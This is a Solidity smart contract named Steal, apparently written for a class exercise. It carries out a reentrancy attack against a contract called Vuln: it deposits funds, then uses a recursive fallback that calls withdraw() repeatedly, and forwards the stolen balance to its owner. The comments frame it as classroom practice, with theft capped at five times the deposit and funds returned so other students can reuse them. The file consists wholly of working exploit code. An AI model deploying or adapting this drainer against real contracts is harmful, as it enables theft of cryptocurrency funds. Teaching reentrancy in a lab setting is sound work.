pragma solidity ^0.5.0;

contract Steal {

    address public owner; // to transfer stolen funds back

    uint public balance = 0; // to track if contract was able to steal from Vuln

    /* steal_count and max_steal used to limit the amount
     * that is stolen from Vuln contract,
     * so that this contract does not empty out the Vuln contract
     */
    uint8 steal_count = 0;

    /*
       this contract steals max_steal times the initial deposit
       from the Vuln contract
     */
    uint8 constant max_steal = 5;

    /* ret values used to prevent warning from
       call functions and also indicate function execution
     */
    bool public ret1;
    bool public ret2;

    constructor() public payable {
        owner = msg.sender;
    }

    /*
    Function to add initial funds into the Vuln
    contract, max_steal times this amount will be
    stolen when steal is called
    */
    function add_fund(address recepient) payable public {
        (ret1,) = recepient.call.value(msg.value)(abi.encodeWithSignature("deposit()"));
    }

    /*
    Fallback function that recursively calls
    steal to grab funds from Vuln contract
    limiting the amount stolen using steal_count
    */
    function() payable external{ 
        require(steal_count <= max_steal,"Steal count exceeded");
        steal_count++;
        balance += msg.value;
        steal(msg.sender);
    }

    /*
       Calls the withdraw function in Vuln
     */
    function steal(address _victim) public {
            (ret2,) = _victim.call(abi.encodeWithSignature("withdraw()"));
    }

    /*
       Function to transfer stolen funds to creator
       of the contract.
       Useful to transfer back stolen funds in Vuln
       contract for other students in class to steal.
     */
    function get_back() public {
        require(msg.sender == owner,"you are not the owner of these funds");
        msg.sender.transfer(balance);
        balance = 0;
    }
}

